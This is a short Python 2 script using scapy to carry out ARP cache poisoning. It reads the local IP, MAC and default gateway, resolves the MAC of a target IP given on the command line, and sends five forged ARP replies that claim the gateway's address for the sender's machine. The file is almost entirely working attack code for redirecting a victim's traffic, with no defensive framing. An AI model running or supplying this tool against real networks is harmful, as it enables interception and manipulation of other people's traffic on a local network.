import subprocess, socket, os, sys, re, StringIO
import fcntl, struct
from scapy.all import *
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

RETRY = 10
TIMEOUT = 2


src_ip = ""
src_mac = ""

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

src_ip = get_ip_address()

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

src_mac = getHwAddr('ens33')


def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

gateway_ip = get_default_gateway_linux()


def ip_2_mac(dst_ip):

	conf.verb=0
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=dst_ip),timeout=2)

        for snd,rcv in ans:
                return str(rcv.sprintf(r"%Ether.src%"))


dst_MAC = ip_2_mac(sys.argv[1])


arpFake = ARP()
arpFake.op = 2
arpFake.psrc = gateway_ip
arpFake.pdst = sys.argv[1]
arpFake.hwdst = dst_MAC



i=0

while i < 5:
	send(arpFake)
	i += 1




